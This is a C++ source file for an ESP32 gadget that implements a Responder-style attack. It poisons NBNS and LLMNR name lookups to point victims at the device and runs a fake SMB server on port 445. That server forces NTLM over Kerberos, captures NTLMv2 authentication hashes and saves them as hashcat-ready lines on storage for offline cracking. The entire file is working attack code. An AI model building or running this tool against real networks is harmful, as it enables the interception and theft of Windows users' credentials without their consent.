#ifdef HAS_NET_TOOLS
#include "utils/network/ResponderUtil.h"

#include "core/Device.h"
#include "utils/StorageUtil.h"

#include <WiFiUdp.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <esp_system.h>
#include <sys/time.h>
#include <cstring>
#include <cctype>

// ── File-scope state (single instance) ────────────────────────────────────────
static char s_nbName[24]    = "UNIGEEK";
static char s_nbDomain[24]  = "WORKGROUP";
static char s_dnsDomain[24] = "unigeek.local";

static ResponderUtil::LogFn s_log = nullptr;
static ResponderUtil::HitFn s_hit = nullptr;
static void*                s_ctx = nullptr;

static const uint16_t NBNS_PORT  = 137;
static const uint16_t LLMNR_PORT = 5355;

static WiFiUDP     nbnsUDP;
static WiFiUDP     llmnrUDP;
static WiFiServer* smbServer = nullptr;

static struct SMBClientState {
  WiFiClient client;
  bool       active = false;
  uint64_t   sessionId = 0;
  uint8_t    challenge[8] = {};
} smbState;

static uint8_t  ntlmType2Buffer[512];
static uint16_t ntlmType2Len = 0;

static uint32_t s_hashCount = 0;
static String   s_lastUser, s_lastDomain, s_lastClient, s_lastQueryName, s_lastQueryProtocol;

static const char* SAVE_DIR  = "/unigeek/wifi/responder";
static const char* HASH_FILE = "/unigeek/wifi/responder/ntlm_hashes.txt";

// SMB flag constants
#define SMB_FLAGS_REPLY 0x80
#define SMB_FLAGS2_UNICODE 0x8000
#define SMB_FLAGS2_ERR_STATUS32 0x4000
#define SMB_FLAGS2_EXTSEC 0x0800
#define SMB_FLAGS2_SIGNING_ENABLED 0x0008
#define SMB_CAP_EXTSEC 0x80000000UL
#define SMB_CAP_LARGE_FILES 0x00000008UL
#define SMB_CAP_NT_SMBS 0x00000010UL
#define SMB_CAP_UNICODE 0x00000004UL
#define SMB_CAP_STATUS32 0x00000040UL
static const uint32_t SMB_CAPABILITIES =
    SMB_CAP_EXTSEC | SMB_CAP_LARGE_FILES | SMB_CAP_NT_SMBS | SMB_CAP_UNICODE | SMB_CAP_STATUS32;

static void logln(const char* msg, uint16_t color) { if (s_log) s_log(s_ctx, msg, color); }

static IPAddress getIPAddress() {
  if (WiFi.status() == WL_CONNECTED) {
    IPAddress ip = WiFi.localIP();
    if (ip && ip != IPAddress(0, 0, 0, 0)) return ip;
  }
  if (WiFi.getMode() & WIFI_MODE_AP) {
    IPAddress ip = WiFi.softAPIP();
    if (ip && ip != IPAddress(0, 0, 0, 0)) return ip;
  }
  return IPAddress(0, 0, 0, 0);
}

static uint64_t getWindowsTimestamp() {
  const uint64_t EPOCH_DIFF = 11644473600ULL;
  struct timeval tv; gettimeofday(&tv, NULL);
  return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
}

// ── NTLM Type 2 (challenge) builder ───────────────────────────────────────────
static void buildNTLMType2Msg(uint8_t* challenge, uint8_t* buffer, uint16_t* len) {
  uint8_t avPairs[512];
  int offset = 0;
  auto appendAVPair = [&](uint16_t type, const char* data) {
    int l = strlen(data);
    avPairs[offset++] = type & 0xFF;
    avPairs[offset++] = (type >> 8) & 0xFF;
    avPairs[offset++] = (l * 2) & 0xFF;
    avPairs[offset++] = ((l * 2) >> 8) & 0xFF;
    for (int i = 0; i < l; i++) { avPairs[offset++] = data[i]; avPairs[offset++] = 0x00; }
  };
  appendAVPair(0x0001, s_nbName);
  appendAVPair(0x0002, s_nbDomain);
  appendAVPair(0x0003, s_nbName);
  appendAVPair(0x0004, s_dnsDomain);
  appendAVPair(0x0005, s_dnsDomain);
  avPairs[offset++] = 0x07; avPairs[offset++] = 0x00; avPairs[offset++] = 0x08; avPairs[offset++] = 0x00;
  uint64_t ts = getWindowsTimestamp(); memcpy(avPairs + offset, &ts, 8); offset += 8;
  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00; avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;

  const int NTLM_HEADER_SIZE = 48;
  memcpy(buffer, "NTLMSSP\0", 8);
  buffer[8] = 0x02; buffer[9] = 0x00; buffer[10] = buffer[11] = 0x00;  // Type 2
  uint16_t targetLen = strlen(s_nbName) * 2;
  buffer[12] = targetLen & 0xFF; buffer[13] = (targetLen >> 8) & 0xFF;
  buffer[14] = buffer[12]; buffer[15] = buffer[13];
  *(uint32_t*)(buffer + 16) = NTLM_HEADER_SIZE;
  *(uint32_t*)(buffer + 20) = 0xE2898215;          // NTLMv2 flags
  memcpy(buffer + 24, challenge, 8);
  memset(buffer + 32, 0, 8);
  uint16_t avLen = offset;
  *(uint16_t*)(buffer + 40) = avLen;
  *(uint16_t*)(buffer + 42) = avLen;
  *(uint32_t*)(buffer + 44) = NTLM_HEADER_SIZE + targetLen;
  for (int i = 0; i < (int)strlen(s_nbName); i++) {
    buffer[NTLM_HEADER_SIZE + 2 * i] = s_nbName[i];
    buffer[NTLM_HEADER_SIZE + 2 * i + 1] = 0x00;
  }
  memcpy(buffer + NTLM_HEADER_SIZE + targetLen, avPairs, avLen);
  *len = NTLM_HEADER_SIZE + targetLen + avLen;
}

// ── Extract + save the captured NTLMv2 hash ───────────────────────────────────
static void extractAndPrintHash(uint8_t* pkt, uint32_t smbLength, uint8_t* ntlm) {
  auto le16 = [](uint8_t* p) -> uint16_t { return p[0] | (p[1] << 8); };
  auto le32 = [](uint8_t* p) -> uint32_t { return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24); };
  uint32_t base = ntlm - pkt;
  uint16_t ntRespLen = le16(ntlm + 20);
  uint32_t ntRespOff = le32(ntlm + 24);
  uint16_t domLen    = le16(ntlm + 28);
  uint32_t domOffset = le32(ntlm + 32);
  uint16_t userLen   = le16(ntlm + 36);
  uint32_t userOffset = le32(ntlm + 40);
  uint16_t wsLen     = le16(ntlm + 44);
  uint32_t wsOffset  = le32(ntlm + 48);

  auto readUTF16 = [&](uint32_t off, uint16_t len) -> String {
    String s; if (base + off + len > smbLength) return s;
    for (uint16_t i = 0; i < len; i += 2) s += (char)pkt[base + off + i];
    return s;
  };
  String domain = readUTF16(domOffset, domLen);
  String username = readUTF16(userOffset, userLen);
  String workstation = readUTF16(wsOffset, wsLen);

  char challHex[17];
  for (int i = 0; i < 8; ++i) sprintf(challHex + 2 * i, "%02X", smbState.challenge[i]);
  challHex[16] = '\0';

  String ntRespHex;
  for (uint16_t i = 0; i < ntRespLen; ++i) {
    char h[3]; sprintf(h, "%02X", pkt[base + ntRespOff + i]); ntRespHex += h;
  }
  String ntProof = ntRespHex.substring(0, 32);
  String blob    = ntRespHex.substring(32);

  // hashcat -m 5600 line: user::domain:serverchallenge:ntproof:blob
  String hashLine = username + "::" + domain + ":" + String(challHex) + ":" + ntProof + ":" + blob;

  if (Uni.Storage && Uni.Storage->isAvailable() && StorageUtil::hasSpace()) {
    Uni.Storage->makeDir(SAVE_DIR);
    fs::File f = Uni.Storage->open(HASH_FILE, FILE_APPEND);
    if (f) { f.println(hashLine); f.close(); }
  }

  s_hashCount++;
  s_lastUser = username;
  s_lastDomain = domain;
  s_lastClient = workstation;

  char buf[64];
  snprintf(buf, sizeof(buf), "HASH! %s\\%s", domain.c_str(), username.c_str());
  logln(buf, TFT_MAGENTA);
  if (s_hit) s_hit(s_ctx);
}

static void terminateSMB1() { smbState.client.stop(); smbState.active = false; }

static const uint8_t spnegoInitToken[] = {
  0x60, 0x3A, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02,
  0xA0, 0x30, 0x30, 0x2E,
  0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A,
  0xA2, 0x20, 0x30, 0x1E, 0x02, 0x01, 0x02, 0x02, 0x01, 0x00 };

// SPNEGO NegTokenInit advertising NTLMSSP as the ONLY supported mechType. Put in
// the SMB2 Negotiate response so the client authenticates with NTLM instead of
// trying Kerberos first — otherwise a domain-joined client sends a Kerberos
// token (no "NTLMSSP") in the first Session Setup and we never get a hash.
static const uint8_t spnegoNtlmOnly[] = {
  0x60, 0x1C,
  0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02,   // SPNEGO OID
  0xA0, 0x12, 0x30, 0x10, 0xA0, 0x0E, 0x30, 0x0C,
  0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A };  // NTLMSSP OID

static void sendSMB1NegotiateResponse(uint8_t* req) {
  uint8_t resp[256] = {0};
  resp[0] = 0x00;
  memcpy(resp + 4, req, 32);
  resp[4 + 4] = 0x72;
  resp[4 + 9] = SMB_FLAGS_REPLY;
  *(uint16_t*)(resp + 4 + 10) =
      SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 | SMB_FLAGS2_EXTSEC | SMB_FLAGS2_SIGNING_ENABLED;
  *(uint32_t*)(resp + 4 + 5) = 0x00000000;
  const uint8_t WC = 17;
  resp[4 + 32] = WC;
  uint8_t* p = resp + 4 + 33;
  *(uint16_t*)(p + 0) = 0x0000;
  *(uint8_t*)(p + 2)  = 0x03;
  *(uint16_t*)(p + 3) = 0x0100;
  *(uint16_t*)(p + 5) = 1;
  *(uint32_t*)(p + 7) = 0x00010000;
  *(uint32_t*)(p + 11) = 0x00010000;
  *(uint32_t*)(p + 15) = 0;
  *(uint32_t*)(p + 19) = SMB_CAPABILITIES;
  *(uint64_t*)(p + 23) = 0;
  *(uint16_t*)(p + 31) = 0;
  *(p + 33) = 0;
  uint16_t bcc = sizeof(spnegoInitToken);
  *(uint16_t*)(resp + 4 + 33 + WC * 2) = bcc;
  memcpy(resp + 4 + 33 + WC * 2 + 2, spnegoInitToken, bcc);
  uint32_t total = 4 + 33 + WC * 2 + 2 + bcc;
  resp[1] = (total - 4) >> 16; resp[2] = (total - 4) >> 8; resp[3] = (total - 4);
  smbState.client.write(resp, total);
}

static void sendSMB1Type2(uint8_t* req, uint8_t* /*ntlm1*/) {
  for (int i = 0; i < 8; ++i) smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
  buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);
  uint8_t resp[512] = {0};
  memcpy(resp + 4, req, 32);
  resp[4 + 4] = 0x73;
  resp[4 + 9] = SMB_FLAGS_REPLY;
  *(uint16_t*)(resp + 4 + 10) =
      SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 | SMB_FLAGS2_EXTSEC | SMB_FLAGS2_SIGNING_ENABLED;
  *(uint32_t*)(resp + 4 + 5) = 0xC0000016;  // MORE_PROCESSING_REQUIRED
  resp[4 + 32] = 4;
  resp[4 + 33] = 0; resp[4 + 34] = resp[4 + 35] = 0;
  *(uint16_t*)(resp + 4 + 38) = ntlmType2Len;
  *(uint16_t*)(resp + 4 + 40) = ntlmType2Len;
  memcpy(resp + 4 + 42, ntlmType2Buffer, ntlmType2Len);
  uint32_t total = 4 + 42 + ntlmType2Len;
  resp[0] = 0x00;
  resp[1] = (total - 4) >> 16; resp[2] = (total - 4) >> 8; resp[3] = (total - 4);
  smbState.client.write(resp, total);
}

static void sendSMB2NegotiateFromSMB1() {
  uint8_t resp[256] = {0};
  resp[0] = 0x00;
  uint8_t* h = resp + 4;
  h[0] = 0xFE; h[1] = 'S'; h[2] = 'M'; h[3] = 'B';
  h[4] = 0x40; h[5] = 0x00; h[6] = 0x00; h[7] = 0x00;
  h[12] = 0x00; h[13] = 0x00; h[14] = 0x01; h[15] = 0x00;
  *(uint32_t*)(h + 16) = 0x00000001;
  *(uint32_t*)(h + 20) = 0x00000000;
  *(uint64_t*)(h + 24) = 0;
  *(uint32_t*)(h + 32) = 0x0000FEFF;
  *(uint32_t*)(h + 36) = 0;
  *(uint64_t*)(h + 40) = 0;
  memset(h + 48, 0, 16);
  uint8_t* p = h + 64;
  p[0] = 0x41; p[1] = 0x00; p[2] = 0x01; p[3] = 0x00;
  p[4] = 0x02; p[5] = 0x02; p[6] = p[7] = 0x00;
  uint8_t serverGuid[16]; for (int i = 0; i < 16; i++) serverGuid[i] = esp_random() & 0xFF;
  memcpy(p + 8, serverGuid, 16);
  *(uint32_t*)(p + 24) = 0x00000000;
  *(uint32_t*)(p + 28) = 0x00010000;
  *(uint32_t*)(p + 32) = 0x00010000;
  *(uint32_t*)(p + 36) = 0x00010000;
  memset(p + 40, 0, 16);
  *(uint16_t*)(p + 56) = 0x0080;                  // SecurityBufferOffset = 128 (header+128)
  *(uint16_t*)(p + 58) = sizeof(spnegoNtlmOnly);  // SecurityBufferLength
  memcpy(p + 64, spnegoNtlmOnly, sizeof(spnegoNtlmOnly));
  uint32_t total = 4 + 128 + sizeof(spnegoNtlmOnly);
  resp[1] = (total - 4) >> 16; resp[2] = (total - 4) >> 8; resp[3] = (total - 4);
  smbState.client.write(resp, total);
}

static void handleSMB1(uint8_t* pkt, uint32_t len) {
  uint8_t command = pkt[4];
  if (command == 0x72) {  // NEGOTIATE
    uint16_t bcc = pkt[33] | (pkt[34] << 8);
    const uint8_t* d = pkt + 35;
    const uint8_t* end = d + bcc;
    bool smb2Asked = false;
    while (d < end && *d == 0x02) {
      const char* name = (const char*)(d + 1);
      if (strncmp(name, "SMB 2", 5) == 0) { smb2Asked = true; break; }
      d += 2 + strlen(name);
    }
    if (smb2Asked) sendSMB2NegotiateFromSMB1();
    else           sendSMB1NegotiateResponse(pkt);
    return;
  }
  if (command == 0x73) {  // SESSION SETUP ANDX
    uint16_t andxOffset = *(uint16_t*)(pkt + 45);
    uint8_t* ntlm = pkt + andxOffset;
    if (memcmp(ntlm, "NTLMSSP", 7) == 0 && len > (uint32_t)andxOffset + 8) {
      uint8_t type = ntlm[8];
      if (type == 1)      { sendSMB1Type2(pkt, ntlm); logln("NTLM: challenge sent", TFT_DARKGREY); }
      else if (type == 3) { logln("NTLM: auth received", TFT_CYAN); extractAndPrintHash(pkt, len, ntlm); terminateSMB1(); }
    }
  }
}

static void decodeNetBIOSLabel(const uint8_t* enc32, char* out, size_t outSize) {
  if (!enc32 || !out || outSize == 0) return;
  out[0] = '\0';
  uint8_t raw[16];
  for (int i = 0; i < 16; ++i) {
    uint8_t c1 = enc32[2 * i], c2 = enc32[2 * i + 1];
    uint8_t hi = (c1 >= 'A' && c1 <= 'P') ? (uint8_t)(c1 - 'A') : 0;
    uint8_t lo = (c2 >= 'A' && c2 <= 'P') ? (uint8_t)(c2 - 'A') : 0;
    raw[i] = (uint8_t)((hi << 4) | lo);
  }
  char name[16]; memcpy(name, raw, 15); name[15] = '\0';
  int e = 14; while (e >= 0 && name[e] == ' ') e--; name[e + 1] = '\0';
  snprintf(out, outSize, "%s<%02X>", name, raw[15]);
}

// ── Per-poll processing of each listener ──────────────────────────────────────
static void processNBNS() {
  int packetSize = nbnsUDP.parsePacket();
  if (packetSize <= 0) return;
  uint8_t buf[100];
  int len = nbnsUDP.read(buf, sizeof(buf));
  if (len < 50) return;
  uint16_t flags = (buf[2] << 8) | buf[3];
  uint16_t qdCount = (buf[4] << 8) | buf[5];
  uint16_t qType = (buf[len - 4] << 8) | buf[len - 3];
  uint16_t qClass = (buf[len - 2] << 8) | buf[len - 1];
  if ((flags & 0x8000) || qdCount < 1 || qType != 0x0020 || qClass != 0x0001) return;
  if (len < 46 || buf[12] != 0x20) return;

  char nbName[40]; decodeNetBIOSLabel(buf + 13, nbName, sizeof(nbName));
  s_lastQueryProtocol = "NBNS"; s_lastQueryName = nbName;
  char l[56]; snprintf(l, sizeof(l), "NBNS ? %s", nbName); logln(l, TFT_YELLOW);

  uint8_t resp[80];
  resp[0] = buf[0]; resp[1] = buf[1];
  resp[2] = 0x84; resp[3] = 0x00;
  resp[4] = 0x00; resp[5] = 0x00; resp[6] = 0x00; resp[7] = 0x01;
  resp[8] = resp[9] = resp[10] = resp[11] = 0x00;
  memcpy(resp + 12, buf + 12, 34);
  resp[46] = 0x00; resp[47] = 0x20; resp[48] = 0x00; resp[49] = 0x01;
  resp[50] = 0x00; resp[51] = 0x00; resp[52] = 0x00; resp[53] = 0x3C;
  resp[54] = 0x00; resp[55] = 0x06; resp[56] = 0x00; resp[57] = 0x00;
  IPAddress ip = getIPAddress();
  resp[58] = ip[0]; resp[59] = ip[1]; resp[60] = ip[2]; resp[61] = ip[3];
  nbnsUDP.beginPacket(nbnsUDP.remoteIP(), nbnsUDP.remotePort());
  nbnsUDP.write(resp, 62);
  nbnsUDP.endPacket();
}

static void processLLMNR() {
  int packetSize = llmnrUDP.parsePacket();
  if (packetSize <= 0) return;
  uint8_t buf[300];
  int len = llmnrUDP.read(buf, sizeof(buf));
  if (len < 12) return;
  uint16_t flags = (buf[2] << 8) | buf[3];
  uint16_t qdCount = (buf[4] << 8) | buf[5];
  uint16_t anCount = (buf[6] << 8) | buf[7];
  if ((flags & 0x8000) || qdCount == 0 || anCount != 0) return;
  uint8_t nameLen = buf[12];
  if (nameLen == 0 || nameLen >= 64 || (13 + nameLen + 4) > len) return;
  if (buf[13 + nameLen] != 0x00) return;
  const uint8_t* qtypePtr = buf + 13 + nameLen + 1;
  uint16_t qType = (qtypePtr[0] << 8) | qtypePtr[1];
  uint16_t qClass = (qtypePtr[2] << 8) | qtypePtr[3];

  char qName[65]; memcpy(qName, buf + 13, nameLen); qName[nameLen] = '\0';
  s_lastQueryName = String(qName); s_lastQueryProtocol = "LLMNR";
  char l[80]; snprintf(l, sizeof(l), "LLMNR ? %s", qName); logln(l, TFT_YELLOW);

  bool isA = (qType == 0x0001), isAAAA = (qType == 0x001C);
  if ((!isA && !isAAAA) || qClass != 0x0001) return;

  uint16_t questionLen = 1 + nameLen + 1 + 2 + 2;
  uint8_t resp[350];
  resp[0] = buf[0]; resp[1] = buf[1];
  resp[2] = 0x84; resp[3] = 0x00;
  resp[4] = 0x00; resp[5] = 0x01; resp[6] = 0x00; resp[7] = 0x01;
  resp[8] = resp[9] = 0x00; resp[10] = resp[11] = 0x00;
  memcpy(resp + 12, buf + 12, questionLen);
  uint16_t ansOff = 12 + questionLen;
  resp[ansOff + 0] = 0xC0; resp[ansOff + 1] = 0x0C;
  resp[ansOff + 2] = qtypePtr[0]; resp[ansOff + 3] = qtypePtr[1];
  resp[ansOff + 4] = 0x00; resp[ansOff + 5] = 0x01;
  resp[ansOff + 6] = 0x00; resp[ansOff + 7] = 0x00; resp[ansOff + 8] = 0x00; resp[ansOff + 9] = 0x1E;
  IPAddress ip = getIPAddress();
  if (isA) {
    resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x04;
    resp[ansOff + 12] = ip[0]; resp[ansOff + 13] = ip[1]; resp[ansOff + 14] = ip[2]; resp[ansOff + 15] = ip[3];
    llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
    llmnrUDP.write(resp, ansOff + 16);
    llmnrUDP.endPacket();
  } else {
    resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x10;
    memset(resp + ansOff + 12, 0, 10);
    resp[ansOff + 22] = 0xFF; resp[ansOff + 23] = 0xFF;
    resp[ansOff + 24] = ip[0]; resp[ansOff + 25] = ip[1]; resp[ansOff + 26] = ip[2]; resp[ansOff + 27] = ip[3];
    llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
    llmnrUDP.write(resp, ansOff + 28);
    llmnrUDP.endPacket();
  }
}

static void processSMB2Packet(uint8_t* packet, uint32_t smbLength) {
  uint16_t command = packet[12] | (packet[13] << 8);
  if (command == 0x0000) {  // NEGOTIATE
    uint8_t resp[200] = {0};
    resp[0] = 0x00;
    memcpy(resp + 4, packet, 64);
    resp[4 + 16] = packet[16] | 0x01;
    *(uint32_t*)(resp + 4 + 8) = 0x00000000;
    resp[4 + 14] = packet[14]; resp[4 + 15] = packet[15];
    if (resp[4 + 14] == 0 && resp[4 + 15] == 0) { resp[4 + 14] = 0x01; resp[4 + 15] = 0x00; }
    memset(resp + 4 + 40, 0, 8);
    resp[4 + 64] = 0x41; resp[4 + 65] = 0x00;
    resp[4 + 66] = 0x01; resp[4 + 67] = 0x00;
    resp[4 + 68] = 0x10; resp[4 + 69] = 0x02;
    resp[4 + 70] = 0x00; resp[4 + 71] = 0x00;
    uint8_t mac[6]; WiFi.macAddress(mac);
    memset(resp + 4 + 72, 0, 16); memcpy(resp + 4 + 72, mac, 6);
    *(uint32_t*)(resp + 4 + 88) = 0x00000000;
    *(uint32_t*)(resp + 4 + 92) = 0x00010000;
    *(uint32_t*)(resp + 4 + 96) = 0x00010000;
    *(uint32_t*)(resp + 4 + 100) = 0x00010000;
    memset(resp + 4 + 104, 0, 16);
    *(uint16_t*)(resp + 4 + 120) = 0x0080;                  // SecurityBufferOffset = 128
    *(uint16_t*)(resp + 4 + 122) = sizeof(spnegoNtlmOnly);  // SecurityBufferLength
    resp[4 + 124] = resp[4 + 125] = resp[4 + 126] = resp[4 + 127] = 0x00;  // NegContextOffset/Reserved2
    memcpy(resp + 4 + 128, spnegoNtlmOnly, sizeof(spnegoNtlmOnly));        // SPNEGO NTLM-only
    uint32_t smb2Len = 128 + sizeof(spnegoNtlmOnly);
    resp[1] = (smb2Len >> 16) & 0xFF; resp[2] = (smb2Len >> 8) & 0xFF; resp[3] = smb2Len & 0xFF;
    smbState.client.write(resp, 4 + smb2Len);
  } else if (command == 0x0001) {  // SESSION SETUP
    int ntlmIndex = -1;
    for (uint32_t i = 0; i + 7 <= smbLength; ++i) {
      if (memcmp(packet + i, "NTLMSSP", 7) == 0) { ntlmIndex = i; break; }
    }
    if (ntlmIndex < 0 || (uint32_t)ntlmIndex + 8 >= smbLength) {
      logln("setup w/o NTLM (kerberos?)", TFT_RED);
      return;
    }
    uint8_t ntlmMsgType = packet[ntlmIndex + 8];
    if (ntlmMsgType == 1) {
      for (int i = 0; i < 8; ++i) smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
      buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);
      smbState.sessionId = ((uint64_t)esp_random() << 32) | esp_random();
      if (smbState.sessionId == 0) smbState.sessionId = 1;
      uint8_t resp[600] = {0};
      resp[0] = 0x00;
      memcpy(resp + 4, packet, 64);
      resp[4 + 16] = packet[16] | 0x01;
      *(uint32_t*)(resp + 4 + 8) = 0xC0000016;
      resp[4 + 14] = packet[14]; resp[4 + 15] = packet[15];
      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;
      resp[4 + 64] = 0x09; resp[4 + 65] = 0x00; resp[4 + 66] = 0x00; resp[4 + 67] = 0x00;
      *(uint16_t*)(resp + 4 + 68) = 0x48;
      *(uint16_t*)(resp + 4 + 70) = ntlmType2Len;
      resp[4 + 72] = resp[4 + 73] = 0x00;
      memcpy(resp + 4 + 72, ntlmType2Buffer, ntlmType2Len);
      uint32_t smb2Len = 64 + 9 + ntlmType2Len;
      resp[1] = (smb2Len >> 16) & 0xFF; resp[2] = (smb2Len >> 8) & 0xFF; resp[3] = smb2Len & 0xFF;
      smbState.client.write(resp, 4 + smb2Len);
      logln("NTLM: challenge sent", TFT_DARKGREY);
    } else if (ntlmMsgType == 3) {
      logln("NTLM: auth received", TFT_CYAN);
      extractAndPrintHash(packet, smbLength, packet + ntlmIndex);
      uint8_t resp[100] = {0};
      resp[0] = 0x00;
      memcpy(resp + 4, packet, 64);
      resp[4 + 16] = packet[16] | 0x01;
      *(uint32_t*)(resp + 4 + 8) = 0x00000000;
      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;
      resp[4 + 64] = 0x09; resp[4 + 65] = 0x00; resp[4 + 66] = 0x00; resp[4 + 67] = 0x00;
      resp[4 + 68] = 0x48; resp[4 + 69] = 0x00; resp[4 + 70] = 0x00; resp[4 + 71] = 0x00;
      resp[4 + 72] = resp[4 + 73] = 0x00;
      uint32_t smb2Len = 64 + 9;
      resp[1] = (smb2Len >> 16) & 0xFF; resp[2] = (smb2Len >> 8) & 0xFF; resp[3] = smb2Len & 0xFF;
      smbState.client.write(resp, 4 + smb2Len);
      smbState.client.stop(); smbState.active = false;
    }
  } else if (command == 0x0003) {  // TREE CONNECT
    smbState.client.stop(); smbState.active = false;
  }
}

static void processSMB() {
  if (!smbServer) return;
  if (!smbState.active) {
    WiFiClient c = smbServer->accept();
    if (c) { smbState.client = c; smbState.active = true; smbState.sessionId = 0; logln("SMB connect", TFT_CYAN); }
  }
  if (smbState.active && smbState.client.connected()) {
    smbState.client.setTimeout(100);
    if (smbState.client.available() >= 4) {
      uint8_t nbss[4];
      if (smbState.client.read(nbss, 4) == 4) {
        uint32_t smbLength = ((uint32_t)nbss[1] << 16) | ((uint32_t)nbss[2] << 8) | nbss[3];
        if (smbLength > 0 && smbLength < 8192) {
          uint8_t* packet = (uint8_t*)malloc(smbLength);
          if (packet) {
            // The NBSS header is already consumed, so the payload MUST be fully
            // assembled — a single read() returns only what's buffered so far and
            // the largest packet (NTLM Type-3, carrying the hash) usually spans
            // several TCP segments. Loop-read until complete (bounded).
            uint32_t got = 0;
            unsigned long t0 = millis();
            while (got < smbLength && smbState.client.connected() && millis() - t0 < 1500) {
              int n = smbState.client.read(packet + got, smbLength - got);
              if (n > 0) { got += n; t0 = millis(); } else { delay(2); }
            }
            if (got == smbLength) {
              if (smbLength >= 64 && packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                char d[24]; snprintf(d, sizeof(d), "rx SMB2 cmd %u", packet[12] | (packet[13] << 8));
                logln(d, TFT_DARKGREY);
                processSMB2Packet(packet, smbLength);
              } else if (packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                logln("rx SMB1", TFT_DARKGREY);
                handleSMB1(packet, smbLength);
              }
            }
            free(packet);
          } else { smbState.client.stop(); smbState.active = false; }
        }
      }
    }
  }
  if (smbState.active && !smbState.client.connected()) { smbState.client.stop(); smbState.active = false; }
}

// ── Public API ────────────────────────────────────────────────────────────────
bool ResponderUtil::begin(const char* nbName, const char* nbDomain, const char* dnsDomain,
                          LogFn log, HitFn hit, void* ctx) {
  s_log = log; s_hit = hit; s_ctx = ctx;
  if (nbName)    { strncpy(s_nbName, nbName, sizeof(s_nbName) - 1);       s_nbName[sizeof(s_nbName) - 1] = 0; }
  if (nbDomain)  { strncpy(s_nbDomain, nbDomain, sizeof(s_nbDomain) - 1); s_nbDomain[sizeof(s_nbDomain) - 1] = 0; }
  if (dnsDomain) { strncpy(s_dnsDomain, dnsDomain, sizeof(s_dnsDomain) - 1); s_dnsDomain[sizeof(s_dnsDomain) - 1] = 0; }

  s_hashCount = 0;
  s_lastUser = s_lastDomain = s_lastClient = s_lastQueryName = s_lastQueryProtocol = "";

  // ESP32 modem-sleep delays/drops incoming TCP — keep the radio awake so the
  // SMB server reliably accepts connections.
  WiFi.setSleep(false);

  nbnsUDP.begin(NBNS_PORT);
  llmnrUDP.beginMulticast(IPAddress(224, 0, 0, 252), LLMNR_PORT);
  if (!smbServer) smbServer = new WiFiServer(445);
  smbServer->begin();
  smbServer->setNoDelay(true);
  smbState.active = false;

  char l[40]; snprintf(l, sizeof(l), "SMB :445 @ %s", WiFi.localIP().toString().c_str());
  logln(l, TFT_GREEN);

  if (Uni.Storage && Uni.Storage->isAvailable()) Uni.Storage->makeDir(SAVE_DIR);
  return true;
}

void ResponderUtil::poll() {
  processNBNS();
  processLLMNR();
  processSMB();
}

void ResponderUtil::stop() {
  if (smbState.active) { smbState.client.stop(); smbState.active = false; }
  nbnsUDP.stop();
  llmnrUDP.stop();
  if (smbServer) { smbServer->stop(); delete smbServer; smbServer = nullptr; }
  s_log = nullptr; s_hit = nullptr; s_ctx = nullptr;
}

uint32_t ResponderUtil::hashCount() const     { return s_hashCount; }
String   ResponderUtil::lastUser() const      { return s_lastUser; }
String   ResponderUtil::lastDomain() const    { return s_lastDomain; }
String   ResponderUtil::lastClient() const    { return s_lastClient; }
String   ResponderUtil::lastQuery() const     { return s_lastQueryName; }
String   ResponderUtil::lastProtocol() const  { return s_lastQueryProtocol; }
#endif // HAS_NET_TOOLS
